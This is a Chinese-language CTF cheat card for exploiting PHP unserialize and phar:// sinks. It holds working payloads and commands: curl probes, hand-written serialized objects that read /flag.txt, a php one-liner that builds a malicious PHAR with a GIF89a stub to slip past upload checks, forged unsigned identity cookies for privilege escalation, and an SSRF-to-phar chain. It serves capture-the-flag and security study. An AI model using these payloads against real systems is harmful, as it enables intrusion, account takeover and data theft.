# 卡:PHP 反序列化 / PHAR 最短路径(没有 phpggc 也能手搓)

**适用**:题目出现 `unserialize($_GET/$_POST/$_COOKIE/... )`、`phar://` 可达的文件操作、
或报错里出现 `__wakeup/__destruct`、`Class not found`、`phpggc` 相关字样。

> 口径:本卡只讲**公开方法论**;具体 POP 链以目标源码为准,不要背题。

## 0. 先确认"能不能控制反序列化入口"(10 分钟)
```bash
# 1) 源码/报错里搜 sink
grep -rn "unserialize(" /var/www 2>/dev/null; grep -rn "phar://" /var/www 2>/dev/null
# 2) 参数级探测:给一个畸形值看行为差异(报错/500 vs 正常)
curl -sk "http://T/?data=O:8:\"NoSuchCl\":0:{}" -i | head -20
```
- **回显差异就是信号**:`Class NoSuchCl not found` → 入口可达且未过滤;
  静默 200 → 可能被 `@` 吞掉或走了别的分支,换 cookie/header 里的同名参数再试。
- 找不到入口时,`phar://` 是第二条路:任何**文件操作**(`file_exists`/`getimagesize`/`include`/`unlink`)
  在 PHP 里都会触发 phar 元数据反序列化 —— 先确认有上传/文件路径可控点。

## 1. 没有 phpggc 时:从源码里"造"一条链(核心步骤)
1. **列出所有类**:`grep -rn "class " /var/www | head -50`、`find / -name "*.php" | xargs grep -l "__destruct\|__wakeup"`。
2. **找危险魔术方法**:`__destruct`/`__wakeup`/`__toString`/`__call`/`__get` 里出现
   `include/require`、`file_get_contents`、`call_user_func`、`eval`、`system`、`unlink`、`file_put_contents`。
3. **顺着属性找落地**:魔术方法调用的属性是否在类里可控(public/protected 都能序列化;
   private 要用 `\0Class\0prop` 长度规则手写)。
4. **构造**:
```python
# 手写序列化(注意 private 属性的 \0 前缀与长度)
payload = 'O:4:"Evil":1:{s:4:"file";s:9:"/flag.txt";}'
```
5. **验证顺序**:先让链走到一个**只读**动作(读文件/列目录),拿到回显再升级为写/执行。

## 2. PHAR 触发(上传 → 文件操作)
```bash
# 生成恶意 phar(不需要目标源码,只要知道类名与属性)
php -d phar.readonly=0 -r '$p=new Phar("/tmp/x.phar"); $p["a"]=new Evil("file","/flag.txt"); $p->setStub("GIF89a<?php __HALT_COMPILER();");'
# 传到目标(扩展名/内容校验用 GIF89a 头绕过),再用 phar:// 触发的文件函数打它
```
- 触发点清单:`file_exists($p)`、`filesize`、`getimagesize`、`md5_file`、`include`、`copy`、`rename`、`unlink`。
- 常见坑:目标 PHP ≥ 8.0 要求 phar 有正确 stub;上传点会重命名/改扩展名 → 记下真实落盘名。

## 3. "class-name oracle"(没有回显时怎么定位类名)
- 序列化一个**不存在的类**:报错含类名 → 说明 unserialize 执行了(入口活着);
- 依次试候选类名(从源码/前端 JS/常见框架名),**存在的类**与不存在的类在响应长度/报错文本/耗时上不同;
- 找到类后,用它的魔术方法反推需要的属性名(源码里的 `$this->xxx`)。

## 4. 环境受限时的替代路径
- DB/service 名字解析不到(NXDOMAIN)、内网第二跳不通:**别在 DNS 上耗时间** —— 反序列化通常能直接读本地文件,
  把 `/flag`、`/flag.txt`、`/challenge/flag.txt` 作为 gadget 的目标值先试一轮。
- 目标有 WAF:序列化串里的 `O:` 常被拦 → 试 `phar://`、base64 参数、双重编码,但**先确认拦截点**再换编码。

## 4.5 两条高频实战主线(公开基准里反复出现)
### A. 无签名的"序列化身份 cookie"(最容易漏,零成本越权)
- **动作**:注册/登录之后,**把浏览器/会话里的每个 cookie 都 base64 解一遍**(`PHPSESSID` 之类是真会话,
  `data`/`profile`/`user` 这类才是重点);出现 `O:<len>:"UserProfile":...` 就是身份对象。
- **典型服务端代码**(公开基准里就是这么写的,可直接对照自己目标):
  `$obj = unserialize(base64_decode($_COOKIE["data"])); $userid = $obj->userid;`
  —— 拿对象里的 `userid` 去查数据,**不与会话身份绑定**。
- **打法**:保留结构、只改 `userid`(或 `id`/`role`/`is_admin`)重新 base64,替换该 cookie;
  **保留有效的会话 cookie**(两者同时带),再请求同一页面 → 读到别人的数据/笔记/flag。
- 示例:`O:11:"UserProfile":2:{s:6:"userid";i:1;s:8:"username";s:4:"test";}`(长度前缀按字节数算)。
- **顺序纪律**:先排除这条,再去看 DB/主机名解析之类的环境噪声 —— 实测有 agent 把 NXDOMAIN 当主线磨了很久。

### B. 多服务拓扑:SSRF 发现内部 API → 代理 ACL 绕过 → phar 上传链
- 形态:对外只有一个反代/前端端口;内部另有 API(常见 `127.0.0.1:4455` 一类)提供 `transfer/validation/process/read` 这类端点;
- 步骤:① 找 SSRF/URL 抓取点读内部 API 文档 → ② 找内部服务是否**直接暴露**(静态目录、302 跳转后变 GET 取文件)
  拿到备份源码 → ③ 找"写文件"端点(base64/上传)把恶意 phar 落到可读路径 → ④ 找"读文件/phar"端点触发反序列化;
- **`phar://` 不一定是"自动"触发**:有的实现是读归档里的**指定成员**(如 `phar://<path>/manifest`)再显式 `unserialize()`
  → 构造 phar 时把恶意对象放进那个成员名,别只塞 metadata;
- **先验证参数是否真的被转发**:SSRF/抓取点的内部请求 body 可能被**硬编码**(公开 issue 里就有
  `http_build_query(['param1'=>'value1'])` 这种写法),那么 `data`/`file_path` 永远到不了内部 sink ——
  此时改走"内部服务直接暴露"的路,或者如实记录"该链路 as shipped 不可达";
- 打挂风险:内部服务很脆(php-fpm 易 OOM),扫描按 `rate-limit-safe-scanning` 的档位走。

## 5. 纪律
- 一次只改一个变量(类名 / 属性 / 目标路径);每次改动都要有一个**预期判别**(报错变化?)。
- 不穷举 payload 变体;两轮实质不同仍无回显 → 换面(找别的 sink 或换漏洞类型)。